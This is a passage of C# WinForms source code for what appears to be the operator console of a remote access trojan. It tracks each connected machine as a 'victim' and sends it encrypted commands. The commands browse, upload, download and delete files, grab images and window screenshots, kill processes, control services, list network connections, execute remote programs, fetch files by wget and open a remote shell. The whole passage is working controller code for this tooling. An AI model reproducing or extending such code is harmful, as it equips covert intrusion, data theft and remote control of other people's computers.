                    {
                        if (!g_bUploadFile)
                        {
                            MessageBox.Show("Stop upload file!", "Signal", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            return;
                        }
                        while (g_bUploadPause)
                        {
                            Thread.Sleep(1000);
                        }

                        buffer = buffer[0..byte_reads];
                        string b64_data = Convert.ToBase64String(buffer);
                        v.encSend(2, 0, string.Join("|", new string[]
                        {
                            "file",
                            "uf",
                            szFlag,
                            "recv",
                            clsCrypto.b64E2Str(tgt_filename),
                            file_len.ToString(), //FILE BYTES LENGTH
                            (i * chunk_size).ToString(), //OFFSET
                            b64_data, //BASE-64 FILE DATA
                        }));

                        i++;
                    }
                }
            }

            g_bUploadFile = false;
        }

        /// <summary>
        /// Send download file request.
        /// </summary>
        /// <param name="l_path">List of remote file path.</param>
        public void File_DownloadFile(List<string[]> l_path, Action actCompleted = null)
        {
            frmFileTransferState f = new frmFileTransferState();
            f.Tag = Function.TransferFileState;
            f.v = v;
            f.files = l_path.Select(x => x[1]).ToList();
            f.transfer_type = TransferFileType.Download;
            f.Text = $@"File Transfer\\{v.ID}";
            f.f_mgr = this;

            if (actCompleted != null)
                f.FileTransferCompleted += () => actCompleted();

            f.Show();

            string data = string.Join(",", l_path
                .Select(x => x[1])
                .Where(x => !string.IsNullOrEmpty(x))
                .Select(x => clsCrypto.b64E2Str(x)).ToArray()
                );

            v.encSend(2, 0, "file|df|send|" + data);
        }

        /// <summary>
        /// Send show image request.
        /// </summary>
        /// <param name="all">Boolean value of show all image in file ListView.</param>
        private void ShowImage_Send(bool all)
        {
            List<string> filename = new List<string>();
            new Thread(() =>
            {
                Invoke(new Action(() =>
                {
                    List<ListViewItem> items = new List<ListViewItem>();
                    if (all) items.AddRange(listView1.Items.Cast<ListViewItem>());
                    else items.AddRange(listView1.SelectedItems.Cast<ListViewItem>());

                    filename.AddRange(items
                            .Select(x => File_GetItemObj(x)[0])
                            .Where(x => clsTools.FileIsImage(x))
                            .Select(x => clsCrypto.b64E2Str(x))
                            .ToArray());

                }));

                Form tmp = clsTools.GetFormByVictim(v, Function.FileImage);
                frmFileShowImg f;
                if (tmp == null)
                {
                    f = new frmFileShowImg();
                    f.Text = $@"File - Show Image\\{v.ID}";
                    f.Tag = Function.FileImage;
                    f.v = v;
                    f.m_nTotalImage = filename.Count;
                    Invoke(new Action(() => f.Show()));
                }

                v.encSend(2, 0, "file|img|" + string.Join(",", filename.ToArray()));
            }).Start();
        }

        /// <summary>
        /// Show image.
        /// This function is used by "Received Handler" in main Form. Do not use this function directly.
        /// </summary>
        /// <param name="data">Image file with base-64 encoded.</param>
        public void File_ShowImage(string data)
        {
            Form tmp = clsTools.GetFormByVictim(v, Function.FileImage);
            frmFileShowImg f;
            new Thread(() =>
            {
                try
                {
                    if (tmp == null)
                    {
                        f = new frmFileShowImg();
                        f.Tag = Function.FileImage;
                        f.Text = @$"File - Show Image\\{v.ID}";
                        f.v = v;
                        Invoke(new Action(() => f.Show()));
                    }
                    else
                    {
                        f = (frmFileShowImg)tmp;
                    }

                    foreach (string item in data.Split(','))
                    {
                        if (string.IsNullOrEmpty(item.Trim()))
                            continue;

                        string[] s = item.Split(';');
                        string filename = clsCrypto.b64D2Str(s[0]);
                        Image img = clsTools.Base64ToImage(s[1]);
                        Invoke(new Action(() => f.ShowImage(filename, img)));
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }).Start();
        }

        /// <summary>
        /// Add new item to remote directory(folder or file).
        /// </summary>
        /// <param name="folder">True: Folder; False: File</param>
        private void File_NewItem(bool folder)
        {
            frmFileMgrNew f = (frmFileMgrNew)clsTools.GetFormByVictim(v, Function.FileNewItem);
            try
            {
                if (f == null)
                {
                    f = new frmFileMgrNew();
                    f.v = v;
                    f.folder = folder;
                    f.dir = textBox1.Tag.ToString();
                    f.Tag = Function.FileNewItem;
                    f.Text = $@"New Item\\{v.ID}";
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Send delete file/folder request.
        /// </summary>
        private void File_SendDelete()
        {
            string[][] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray()
                .Select(x => File_GetItemObj(x)).ToArray();
            string[] folders = items.Where(x => x[1] == "d").Select(x => x[0]).ToArray();
            string[] files = items.Where(x => x[1] == "f").Select(x => x[0]).ToArray();

            frmFileDelState f = new frmFileDelState();
            f.l_folder = folders.ToList();
            f.l_file = files.ToList();
            f.v = v;
            f.Tag = Function.FileDelState;
            f.f_mgr = this;
            f.Text = $@"File Delete\\{v.ID}";
            f.Show();

            folders = folders.Select(x => clsCrypto.b64E2Str(x)).ToArray();
            files = files.Select(x => clsCrypto.b64E2Str(x)).ToArray();

            DialogResult dia = MessageBox.Show($"Do you want to delete {files.Length} item{(files.Length > 1 ? "s" : string.Empty)} ?", "Sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dia == DialogResult.Yes)
            {
                int thd_cnt = 10;
                v.encSend(2, 0, $"file|del|{thd_cnt}|{string.Join(",", folders)}|{string.Join(",", files)}");
            }
        }

        /// <summary>
        /// Show delete file state.
        /// </summary>
        /// <param name="d1">File state.</param>
        /// <param name="d2">Folder state.</param>
        private void File_ShowDeleteState(string d1, string d2)
        {
            frmFileDelState f = (frmFileDelState)clsTools.GetFormByVictim(v, Function.FileDelState);
            if (f == null)
                return;

            List<string[]> func(string d)
            {
                return d.Split(',').Select(x => x.Split(';')).Select(x => new string[]
                {
                    x[0],
                    clsCrypto.b64D2Str(x[1]),
                    clsCrypto.b64D2Str(x[2]),
                }).ToList();
            }

            List<string[]> file_state = func(d1);
            List<string[]> folder_state = func(d2);
            f.ShowDelState(folder_state, file_state);
        }

        /// <summary>
        /// Set "File" function clipboard.
        /// </summary>
        /// <param name="copy">true: Copy, false: Cut(Delete after copy)</param>
        private void File_SetClipboard(bool copy)
        {
            //copy: 0: MOVE; 1: COPY
            //treeView7

            //INIT
            TreeNode nState = treeView7.Nodes[0];
            TreeNode nDir = treeView7.Nodes[1];
            TreeNode nFile = treeView7.Nodes[2];

            l_CutClipboard.Clear();
            l_CopyClipboard.Clear();

            //CLEAR CLIPBOARD TREE VIEW NODES
            nDir.Nodes.Clear();
            nFile.Nodes.Clear();

            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string[] objs = File_GetItemObj(item);
                TreeNode node = new TreeNode(Path.GetFileName(objs[0]));
                node.ToolTipText = objs[0];
                node.Tag = new string[]
                {
                    objs[0],
                    objs[1],
                    copy ? "1" : "0",
                };
                switch (objs[1])
                {
                    case "d":
                        nDir.Nodes.Add(node);
                        if (copy)
                            l_CopyClipboard.Add(new string[] { objs[1], objs[0] });
                        else
                            l_CutClipboard.Add(new string[] { objs[1], objs[0] });
                        break;
                    case "f":
                        nFile.Nodes.Add(node);
                        if (copy)
                            l_CopyClipboard.Add(new string[] { objs[1], objs[0] });
                        else
                            l_CutClipboard.Add(new string[] { objs[1], objs[0] });
                        break;
                }
            }

            nState.Nodes[0].Text = $"Type[{(copy ? "Copy" : "Cut")}]";
            nState.Nodes[1].Text = $"Count[{nDir.Nodes.Count + nFile.Nodes.Count}]";
            treeView7.ExpandAll();
        }

        /// <summary>
        /// Paste from clipboard.
        /// </summary>
        private void File_PasteFromClipboard()
        {
            if (l_CopyClipboard.Count == 0 && l_CutClipboard.Count == 0)
                return;

            string type = string.Empty;
            List<string[]> items = new List<string[]>();
            if (l_CutClipboard.Count > 0)
            {
                type = "mv";
                items = l_CutClipboard;
            }
            else if (l_CopyClipboard.Count > 0)
            {
                type = "cp";
                items = l_CopyClipboard;
            }

            string[] folders = items.Where(x => x[0] == "d").Select(x => clsCrypto.b64E2Str(x[1])).ToArray();
            string[] files = items.Where(x => x[0] == "f").Select(x => clsCrypto.b64E2Str(x[1])).ToArray();

            frmFilePaste f = new frmFilePaste();
            f.Tag = Function.FilePaste;
            f.v = v;
            f.f_mgr = this;
            f.Text = @$"File Clipboard\\{v.ID}";
            f.Show();

            v.encSend(2, 0, $"file|paste|{type}|{string.Join(",", folders)}|{string.Join(",", files)}|{clsCrypto.b64E2Str(textBox1.Tag.ToString())}");
        }

        /// <summary>
        /// "File" scan dir.
        /// </summary>
        /// <param name="path"></param>
        private void File_ScanDir(string path)
        {
            int d_limit = mgrConfig.fileMgr_dwMaxFolder;
            int f_limit = mgrConfig.fileMgr_dwMaxFile;

            if (!mgrConfig.fileMgr_bMaxFolder)
                d_limit = -1;
            if (!mgrConfig.fileMgr_bMaxFile)
                f_limit = -1;

            listView1.Items.Clear();
            v.encSend(2, 0, $"file|sd|{path}|{d_limit}|{f_limit}");
            toolStripStatusLabel2.Text = "Loading...";
        }

        private void File_ScanShortCut()
        {
            TreeNode selectedNode = treeView6.SelectedNode;
            if (selectedNode.Parent == null)
                return;

            string path = selectedNode.Tag.ToString();
            File_ScanDir(path);
        }

        /// <summary>
        /// Show archive winform.
        /// </summary>
        /// <param name="action"></param>
        private void File_ArchiveFormStartup(ArchiveAction action)
        {
            List<string[]> lsEntries = new List<string[]>();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                object[] objs = (object[])item.Tag;
                string[] entry =
                {
                    (string)objs[1],
                    (string)objs[0]
                };

                if (entry[0] == "d" && entry[1][entry[1].Length - 1] != '\\')
                    entry[1] += "\\";

                lsEntries.Add(entry);
            }

            if (lsEntries.Count == 0)
            {
                MessageBox.Show("You select nothing...", "Empty list", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            frmFileArchive f = new frmFileArchive();
            f.archiveAction = action;
            f.v = v;
            f.lsEntries = lsEntries;
            f.currentPath = (string)textBox1.Tag;
            f.Tag = Function.FileArchive;
            f.Text = $@"ZipFile\\{v.ID}";
            f.f_mgr = this;
            f.Show();
        }

        private void fnFileCopyPath()
        {

        }

        //OTHER FUNCTION
        /// <summary>
        /// Convert selected item in file ListView into List.
        /// </summary>
        /// <returns></returns>
        private List<ListViewItem> File_SelectedItemsToList()
        {
            List<ListViewItem> items = new List<ListViewItem>();
            foreach (ListViewItem item in listView1.SelectedItems)
                items.Add(item);

            return items;
        }

        /// <summary>
        /// Return TreeNode of current directory.
        /// </summary>
        /// <returns>Current node.</returns>
        private TreeNode GetCurrentFilePathTreeNode()
        {
            if (textBox1.Tag == null)
            {
                MessageBox.Show("Unexpected null tag.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            string cp = textBox1.Tag.ToString();
            TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, cp);
            if (node == null)
            {
                MessageBox.Show("Unexpected null TreeNode", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            return node;
        }

        /// <summary>
        /// Refresh file ListView.
        /// </summary>
        public void fileLV_Refresh()
        {
            Invoke(new Action(() =>
            {
                TreeNode node = GetCurrentFilePathTreeNode();
                treeView1.SelectedNode = null;
                treeView1.SelectedNode = node;
                listView1.Refresh();
            }));
        }

        public void File_FindStartup()
        {
            frmFileFind f = new frmFileFind();
            f.v = v;
            f.currentPath = (string)textBox1.Tag;
            f.Tag = Function.FileFind;
            f.Text = $@"FileFind\\{v.ID}";
            f.Show();
        }

        public void File_WgetUpdate(string szUrl, string szRmotePath, int nCode, string msg)
        {
            if (nCode == 0)
            {
                MessageBox.Show(msg, "Wget error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            frmFileWGET f = (frmFileWGET)clsTools.GetFormByVictim(v, Function.FileWGET);
            if (f == null)
                return;

            f.Update(szUrl, szRmotePath, msg);
        }

        private bool fnItemIsFile(ListViewItem item)
        {
            if (item.Tag == null)
                return false;

            object[] aObj = (object[])item.Tag;
            return aObj[1].ToString() == "f";
        }

        #endregion
        #region WindowMgr

        private void Window_ReqInit()
        {
            //listView5.Columns.Clear();
            listView5.Items.Clear();
            treeView4.Nodes.Clear();

            v.encSend(2, 0, $"window|init");

            toolStripStatusLabel6.Text = "Loading...";
        }
        /// <summary>
        /// "Window" function initialization.
        /// </summary>
        /// <param name="data"></param>
        public void WindowInit(List<WindowInfo> lsWindow)
        {
            try
            {
                ImageList il = new ImageList();
                int width = 0;
                Invoke(new Action(() =>
                {
                    width = listView5.Font.Height;
                    listView5.SmallImageList = il;
                    listView5.LargeImageList = il;
                    il.ImageSize = new Size(width, width);
                }));

                foreach (WindowInfo info in lsWindow)
                {
                    ListViewItem item = new ListViewItem(""); //IMAGE
                    item.SubItems.Add(info.szTitle);
                    item.SubItems.Add(Path.GetFileName(info.szFilePath));
                    item.SubItems.Add(info.nProcessId.ToString());
                    item.SubItems.Add(info.nHandle.ToString());
                    item.SubItems.Add(info.szFilePath);
                    item.ImageKey = info.nHandle.ToString();

                    Invoke(new Action(() =>
                    {
                        listView5.Items.Add(item);
                        if (info.iWindow != null)
                        {
                            il.Images.Add(info.nHandle.ToString(), info.iWindow);
                            //MessageBox.Show(info.iWindow.Size.ToString());
                        }

                        string name = Path.GetFileName(info.szFilePath);
                        TreeNode node = FindTreeNodeByFullPath(treeView4.Nodes, name);
                        if (node == null)
                            treeView4.Nodes.Add(new TreeNode(name));
                    }));
                }

                Invoke(new Action(() =>
                {
                    toolStripStatusLabel6.Text = $"Window[{listView5.Items.Count}]";
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void Window_ShowScreenshot(string handle, Image img)
        {
            Invoke(new Action(() =>
            {
                try
                {
                    if (f_winCap == null || f_winCap.IsDisposed)
                    {
                        f_winCap = new frmWindowCapture();
                        f_winCap.Text = "Window Capture";
                        f_winCap.StartPosition = FormStartPosition.CenterScreen;
                        f_winCap.v = v;
                        f_winCap.Show();
                    }

                    ListViewItem item = listView5.Items.Cast<ListViewItem>().Where(x => string.Equals(handle, x.SubItems[4].Text)).ToArray()[0];
                    f_winCap.ShowImage(handle, item.SubItems[1].Text, img);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }));
        }

        #endregion
        #region TaskMgr
        //Initialization
        private void Task_ReqInit()
        {
            listView2.Columns.Clear();
            listView2.Items.Clear();
            treeView2.Nodes.Clear();

            v.encSend(2, 0, $"task|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
        }
        /// <summary>
        /// "TaskMgr" function initialization.
        /// </summary>
        /// <param name="data">Encoded tasks data.</param>
        public void TaskInit(string data)
        {
            Invoke(new Action(
                () => listView2.Columns.AddRange(
                    dic_fields["task"].Select(
                        x => new ColumnHeader()
                        {
                            Width = 120,
                            Text = x,
                        }
                    ).ToArray()
                )
            ));

            bool column_changed = false;
            foreach (string row in data.Split(','))
            {
                List<string[]> tmp = clsCrypto.b64D2Str(row).Split(',').Select(x => clsCrypto.b64D2Str(x).Split(';')).ToList();
                string[] props = dic_fields["task"];
                string[][] _tmp = tmp.Where(x => string.Equals(x[0], props[0], StringComparison.CurrentCultureIgnoreCase)).ToArray();
                ListViewItem item = new ListViewItem(_tmp[0][1]);
                Invoke(new Action(() => listView2.Columns[0].Text = _tmp[0][0]));
                for (int i = 1; i < props.Length; i++)
                {
                    _tmp = tmp.Where(x => string.Equals(x[0], props[i], StringComparison.CurrentCultureIgnoreCase)).ToArray();
                    item.SubItems.Add(_tmp[0][1]);
                    if (!column_changed)
                    {
                        Invoke(new Action(() => listView2.Columns[i].Text = _tmp[0][0]));
                    }
                }
                column_changed = true;
                Invoke(new Action(() =>
                {
                    listView2.Items.Add(item);

                    TreeNode procNode = null;
                    foreach (TreeNode tmpNode in treeView2.Nodes)
                    {
                        if (tmpNode.Text == item.Text)
                        {
                            procNode = tmpNode;
                            break;
                        }
                    }

                    if (procNode == null)
                    {
                        TreeNode node = new TreeNode(item.Text);
                        treeView2.Nodes.Add(node);

                        procNode = node;
                    }

                    procNode.Nodes.Add(new TreeNode($"{item.Text} ({item.SubItems[1].Text})"));
                }));
            }

            Invoke(new Action(() =>
            {
                g_lsTaskLv = listView2.Items.Cast<ListViewItem>().ToList();
                toolStripStatusLabel3.Text = $"Process[{g_lsTaskLv.Count}]";
            }));
        }
        /// <summary>
        /// Send kill selected process command request with process id.
        /// </summary>
        private void Task_SendKill()
        {
            string[] id_tasks = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
            if (id_tasks.Length == 0)
                return;

            DialogResult msg = MessageBox.Show($"Do you want to delete {id_tasks.Length} task{(id_tasks.Length == 1 ? string.Empty : "s")} ?", "Sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (msg != DialogResult.Yes)
                return;

            v.encSend(2, 0, "task|kill|" + string.Join(",", id_tasks));
        }
        /// <summary>
        /// Send kill and delete process command request with process id.
        /// </summary>
        private void Task_SendKillAndDelete()
        {
            string[] id_tasks = listView2.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray();
            v.encSend(2, 0, "task|kd|" + string.Join(",", id_tasks));
        }
        /// <summary>
        /// Send start process command request.
        /// </summary>
        private void Task_SendStart()
        {

        }
        /// <summary>
        /// Send "show task" information request with process id.
        /// </summary>
        private void Task_SendInfo()
        {

        }
        private void Task_GetChildProc(string procName)
        {

        }
        private void Task_RegexSearch(string szPattern)
        {
            listView2.Items.Clear();
            foreach (ListViewItem item in g_lsTaskLv)
            {
                for (int i = 0; i < item.SubItems.Count; i++)
                {
                    try
                    {
                        if (Regex.IsMatch(item.SubItems[i].Text, szPattern, RegexOptions.IgnoreCase) && !listView2.Items.Contains(item))
                        {
                            listView2.Items.Add(item);
                            break;
                        }
                    }
                    catch
                    {
                        return;
                    }
                }
            }
        }

        #endregion
        #region ServMgr

        private void Serv_ReqInit()
        {
            listView3.Columns.Clear();
            listView3.Items.Clear();
            richTextBox1.Text = string.Empty;

            v.encSend(2, 0, $"serv|init|{clsCrypto.b64E2Str($"select {string.Join(",", dic_fields["serv"])} from win32_service")}");
        }
        /// <summary>
        /// "Service" function initialization.
        /// </summary>
        /// <param name="data">Encoded services data.</param>
        public void ServInit(string data)
        {
            Invoke(new Action(
                () => listView3.Columns.AddRange(
                    dic_fields["serv"].Select(
                        x => new ColumnHeader()
                        {
                            Width = 120,
                            Text = x,
                        }
                    ).ToArray()
                )
            ));

            bool column_changed = false;
            foreach (string row in data.Split(','))
            {
                List<string[]> tmp = clsCrypto.b64D2Str(row).Split(',').Select(x => clsCrypto.b64D2Str(x).Split(';')).ToList();
                string[] props = dic_fields["serv"];
                string[][] _tmp = tmp.Where(x => string.Equals(x[0], props[0], StringComparison.CurrentCultureIgnoreCase)).ToArray();
                ListViewItem item = new ListViewItem(_tmp[0][1]);
                Invoke(new Action(() => listView3.Columns[0].Text = _tmp[0][0]));
                item.ImageIndex = 2;
                for (int i = 1; i < props.Length; i++)
                {
                    _tmp = tmp.Where(x => string.Equals(x[0], props[i], StringComparison.CurrentCultureIgnoreCase)).ToArray();
                    item.SubItems.Add(_tmp[0][1]);
                    if (!column_changed)
                    {
                        Invoke(new Action(() => listView3.Columns[i].Text = _tmp[0][0]));
                    }
                }
                column_changed = true;
                Invoke(new Action(() => listView3.Items.Add(item)));
            }

            Invoke(new Action(() =>
            {
                g_lsServLv = listView3.Items.Cast<ListViewItem>().ToList();
                toolStripStatusLabel1.Text = $"Service[{g_lsServLv.Count}]";
            }));
        }
        private string[] Serv_GetNames()
        {
            string[] names = listView3.SelectedItems.Cast<ListViewItem>().Select(x => clsCrypto.b64E2Str(x.Text)).ToArray();
            return names;
        }
        private void Serv_ReqStart(bool start)
        {
            //TRUE: START; FALSE: STOP

            string[] names = Serv_GetNames();
            v.encSend(2, 0, $"serv|control|{names}|{(start ? "Running" : "Stopped")}");
        }
        private void Serv_ReqPause()
        {
            string[] names = Serv_GetNames();
            v.encSend(2, 0, $"serv|control|{names}|Paused");
        }
        private void Serv_ReqRestart()
        {
            string[] names = Serv_GetNames();
            v.encSend(2, 0, $"serv|control|{names}|restart");
        }
        private void Serv_RegexSearch(string szPattern)
        {
            listView3.Items.Clear();
            foreach (ListViewItem item in g_lsServLv)
            {
                for (int i = 0; i < g_lsServLv.Count; i++)
                {
                    try
                    {
                        if (Regex.IsMatch(item.SubItems[i].Text, szPattern, RegexOptions.IgnoreCase) && !listView3.Items.Contains(item))
                        {
                            listView3.Items.Add(item);
                            break;
                        }
                    }
                    catch
                    {
                        return;
                    }
                }
            }
        }

        #endregion
        #region Conn

        private void Conn_ReqInit()
        {
            v.encSend(2, 0, $"conn|init");
        }
        /// <summary>
        /// "Connection" function initalization.
        /// </summary>
        /// <param name="data">Encoded connections data.</param>
        public void ConnInit(string data)
        {
            foreach (string conn in data.Split(";"))
            {
                string[] s = conn.Split(",");
                string protocol = s[0];
                string[] local_host = s[1].Split(":");
                string local_ip = string.Join(":", local_host[0..(local_host.Length - 1)]);
                string local_port = local_host[local_host.Length - 1];
                string[] remote_host = s[2].Split(":");
                string remote_ip = string.Join(":", remote_host[0..(remote_host.Length - 1)]);
                string remote_port = remote_host[remote_host.Length - 1];
                string state = s[3];

                ListViewItem item = new ListViewItem(protocol);
                item.SubItems.Add(local_ip);
                item.SubItems.Add(local_port);
                item.SubItems.Add(remote_ip);
                item.SubItems.Add(remote_port);
                item.SubItems.Add(state);

                Invoke(new Action(() => listView4.Items.Add(item)));
            }
        }

        #endregion

        void setup()
        {
            listView1.SmallImageList = clsStore.il_extension;
            listView1.LargeImageList = clsStore.il_extension;
            clsStore.il_extension.ImageSize = new Size(25, 25);
            clsStore.il_extension.ColorDepth = ColorDepth.Depth32Bit;
            clsStore.il_extension.Images.Add("folder", imageList1.Images[0]);
            tabControl2.SelectedIndex = 1;

            //Reg
            treeView3.SelectedImageIndex = 10;
            tabControl3.SelectedIndex = 1;

            string[] payload = new string[]
            {
                "file",
                "task",
                "reg",
                "serv",
                "conn",
                "window",
                "user",
            };

            v.encSend(2, 0, $"file|init|{200}|{200}");
            //v.encSend(2, 0, $"task|init|{Crypto.b64E2Str($"select {string.Join(",", dic_fields["task"])} from win32_process")}");
            Task_ReqInit();
            v.encSend(2, 0, $"reg|init");
            Conn_ReqInit();
            Serv_ReqInit();
            Window_ReqInit();
        }

        #region Controls events

        private void frmManager_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                TreeNode selected_node = treeView1.SelectedNode;
                treeView1.SelectedImageIndex = selected_node.ImageIndex;

                string selected_path = selected_node.FullPath;
                if (selected_node.Parent == null)
                    selected_path += "\\";

                File_ScanDir(selected_path);
            }
            catch
            {

            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                v.SendCommand($"file|goto|{clsCrypto.b64E2Str(textBox1.Text)}");
            }
        }

        private void listView5_DoubleClick(object sender, EventArgs e)
        {

        }

        private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
        {
            try
            {
                TreeNode node = treeView3.SelectedNode;
                treeView3.SelectedImageIndex = node.ImageIndex;
                listView6.Items.Clear();
                string[] s = node.FullPath.Split("\\");
                string root = s[1];
                string node_path = string.Join("\\", s[2..]);
                v.encSend(2, 0, $"reg|item|{root}|" + clsCrypto.b64E2Str(node_path));
            }
            catch (Exception ex)
            {

            }
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string path = textBox2.Text;
                string[] s = path.Split("\\");
                string root = s[1];
                path = string.Join("\\", s[2..]);
                v.encSend(2, 0, $"reg|goto|{root}|{clsCrypto.b64E2Str(path)}");
            }
        }

        //READ FILE
        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                ListViewItem item = listView1.SelectedItems[0];
                string[] objs = File_GetItemObj(item);
                if (objs[1] == "d")
                {
                    string dir = objs[0];
                    TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, dir);
                    if (node != null)
                    {
                        treeView1.SelectedNode = node;
                    }
                }
                else
                {
                    File_SendRead(item);
                }
            }
        }
        //READ FILE
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
                File_SendRead(item);
        }

        //SHOW IMAGE
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            List<ListViewItem> items = File_SelectedItemsToList();
            string files = string.Join(",",
                items.Select(x => File_GetItemObj(x))
                .Where(x => x[1] == "f")
                .Select(x => clsCrypto.b64E2Str(x[0]))
                .ToArray()
                );

            v.encSend(2, 0, "file|img|" + files);
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        //COPY
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            File_SetClipboard(true);
        }

        //MOVE
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            File_SetClipboard(false);
        }

        //PASTE
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            File_PasteFromClipboard();
        }

        //DELETE
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            File_SendDelete();
        }

        private void tabControl1_KeyDown(object sender, KeyEventArgs e)
        {

        }

        //UPLOAD FILE
        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            List<string[]> l_path = new List<string[]>();
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                foreach (string file in ofd.FileNames)
                {
                    l_path.Add(new string[]
                    {
                        "", //REMAIN FOR DIRECTORY
                        file , //FILE
                    });
                }
                new Thread(() => File_UploadFile(l_path, textBox1.Text)).Start();
            }
        }
        //DOWNLOAD FILE
        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            List<string[]> l_path = new List<string[]>();
            List<ListViewItem> lsFolder = new List<ListViewItem>();
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                string[] objs = File_GetItemObj(item);
                if (objs[1] == "f")
                {
                    l_path.Add(new string[]
                    {
                        string.Empty,
                        objs[0],
                    });
                }
                else if (objs[1] == "d")
                {
                    lsFolder.Add(item);
                }
            }

            if (lsFolder.Count > 0)
            {
                DialogResult dr = MessageBox.Show(
                        $"Your download task contain folder, please compress all folder and file and download it.",
                        "File Manager",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning
                    );

                return;
            }

            File_DownloadFile(l_path);
        }

        //SHOW IMAGE - ALL
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            ShowImage_Send(true);
        }
        //SHOW IMAGE - SELECTED
        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            ShowImage_Send(false);
        }

        //SELECT ALL ITEM IN FILE LIST VIEW
        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Selected = true;
        }
        //UNSELECT ALL ITEM IN FILE LIST VIEW
        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Selected = false;
        }

        //FILE - CREATE NEW FOLDER
        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            File_NewItem(true);
        }
        //FILE - CREATE NEW FILE
        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            File_NewItem(false);
        }

        //FILE - PARENT
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            TreeNode node = GetCurrentFilePathTreeNode();
            if (node.Parent != null)
                treeView1.SelectedNode = node.Parent;
        }
        //FILE - REFRESH
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            fileLV_Refresh();
        }

        //EXECUTE FILE
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            frmFileMgrExec f = new frmFileMgrExec();
            f.v = v;

            if (listView1.SelectedItems.Count > 0)
                f.szRemoteExecutable = listView1.SelectedItems[0].Text;

            f.szCurrentDir = File_GetCurrentPath();
            f.Text = "Execute";

            f.ShowDialog();
        }
        //OPEN SHELL IN CURRENT DIRECTORY
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmShell f = (frmShell)clsTools.GetFormByVictim(v, Function.Shell);
            if (f == null)
                f = new frmShell(current_path);
            f.v = v;
            f.Tag = Function.Shell;
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Text = $@"Shell\\{v.ID}";
            f.Show();
        }

        //FILE - KEY DOWN
        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                switch (e.KeyCode)
                {
                    case Keys.A:
                        foreach (ListViewItem item in listView1.Items)
                            item.Selected = true;
                        break;
                    case Keys.F:
                        frmListViewFind f = new frmListViewFind();
                        f.lv = listView1;
                        f.Text = "Find Item";
                        f.Show();
                        break;
                    case Keys.C:
                        File_SetClipboard(true);
                        break;
                    case Keys.X:
                        File_SetClipboard(false);
                        break;
                    case Keys.V:
                        File_PasteFromClipboard();
                        break;
                }
            }
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.Delete:
                        File_SendDelete();
                        break;
                    case Keys.F5:
                        fileLV_Refresh();
                        break;
                    case Keys.Enter:
                        ListViewItem[] items = listView1.SelectedItems.Cast<ListViewItem>().ToArray();
                        if (items.Length > 0)
                        {
                            ListViewItem item = items[0];
                            string[] objs = File_GetItemObj(item);
                            if (objs[1] == "d")
                            {
                                string dir = objs[0];
                                TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, dir);
                                if (node != null)
                                {
                                    treeView1.SelectedNode = node;
                                }
                            }
                            else
                            {
                                File_SendRead(item);
                            }
                        }
                        break;
                }
            }
        }

        //FILE - HOME DIRECTORY
